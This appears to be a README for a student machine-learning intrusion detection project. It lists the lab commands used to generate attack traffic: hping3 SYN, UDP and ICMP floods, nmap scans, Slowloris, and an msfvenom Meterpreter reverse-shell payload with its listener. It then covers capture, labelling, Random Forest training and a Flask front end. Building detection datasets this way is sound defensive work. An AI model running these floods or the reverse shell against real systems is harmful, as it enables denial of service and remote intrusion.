# ML-IDS


Steps :- 
1. Project Planning & Objective Definition

-> Identified the need for a smarter, ML-based IDS.

-> Defined project aim: Detect various attacks in real time using machine learning.

2. Environment Setup

-> Set up host machine and two virtual machines (Attacker: Kali, Victim: Ubuntu).

-> Installed tools: Wireshark, Metasploit, Nmap, Scapy, CICFlowMeter, Flask, Python, joblib.

3. Attack Type Selection

-> We have chossen multiple attacks for the dataset | we have chosen these attacks on the basic of what type of protocols it uses also which port it targets
-> run these all these commands on attack machine and used the command provided at last to capture the attack traffic after performing the attack

-> SYN Flood  -  sudo hping3 -S -p 80 --flood 192.168.100.4



   

-> UDP Flood  -  sudo hping3 --udp -p 53 --flood 192.168.100.4



  

-> ICMP Flood  -  sudo hping3 -1 --flood 192.168.100.4



  

->  Nmap Scans  - 🔸 Normal TCP Connect Scan -> nmap -sT 192.168.100.4
 
 
 
-->  🔸 Aggressive Scan with OS and Version Detection -> nmap -A -T4 192.168.100.4




-> FIN Scan
 - sudo nmap -sF 192.168.100.4


  

-> NULL Scan
- sudo nmap -sN 192.168.100.4




  

-> Xmas Scan
 - sudo nmap -sX 192.168.100.4




  

-> Protocol Obfuscation Attack (Slowloris attack performed using Python)

  intallation of slowloris
    -> git clone https://github.com/gkbrk/slowloris
        cd slowloris

  run the attack: 
  -> python3 slowloris.py 192.168.100.4






-> Reverse Shell (It is a Metasploit Payload)
   
payload creation: 

- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4444 -f elf > shell.elf
- chmod +x shell.elf

Starting Metasploit Listener: 

- msfconsole

{run this whole in one time}
- use exploit/multi/handler
  set PAYLOAD linux/x86/meterpreter/reverse_tcp
  set LHOST 192.168.100.5
  set LPORT 4444
  exploit

- Now Execute payload on victim

  ./shell.elf








-> Normal Traffic Generation

  - Basic Web Browsing
  -  File Transfer with Netcat :
        1. on victim : nc -l -p 1234 > received_file.txt
        2. on attacker : nc 192.168.100.4 1234 < sample_file.txt






-> HTTP Requests (run Together)
   - curl -X GET http://192.168.100.4/api/test
     curl -X POST -d "data=test" http://192.168.100.4/api/post






  
this command i have used in victim machine every attack time this helps me capturuing each and every network traffic capture and saves it with .pcap file

- sudo tcpdump -i eth0 -w attack_name_capture.pcap




4. Packet Capture

-> Generated traffic using tools like Metasploit, Nmap, Scapy.

-> Captured packets using Wireshark and tcpdump into .pcap files.

5. Flow Conversion

-> Converted .pcap files to flow-based .csv using CICFlowMeter.

6. Labeling and Combining Dataset

-> Labeled each flow file with its corresponding attack or "normal".

-> Combined all labeled .csv files into a single dataset (~900,000+ rows).

7. Data Preprocessing

-> Dropped irrelevant columns (e.g., IPs, timestamps).

-> Normalized features.

-> Encoded categorical features if needed.

8. Model Selection and Training

-> Tried multiple models: Random Forest, SVM, Logistic Regression.

-> Finalized Random Forest Classifier based on best accuracy.

9. Model Evaluation

-> Split data into training and test sets.

-> Evaluated using accuracy, precision, recall, F1-score.

-> Achieved ~98% accuracy.

10. Model Saving

-> Exported the trained model as best_ids_model.pkl using joblib.

11. Flask Web Application Development

-> Built a simple web interface using Flask and Bootstrap.

-> Created input form to enter flow features manually.

12. Model Integration with Flask

-> Loaded the trained model in Flask backend.

-> Created /predict route to classify input and return prediction.

13. Testing the Web App

-> Ran the Flask server.

-> Entered sample flow inputs into the web form.

-> Validated predictions (Normal/Attack Type).

14. Real-Time Simulation

-> Simulated new attacks live.

-> Captured and converted flows.

-> Tested prediction by entering new flows in the web app.

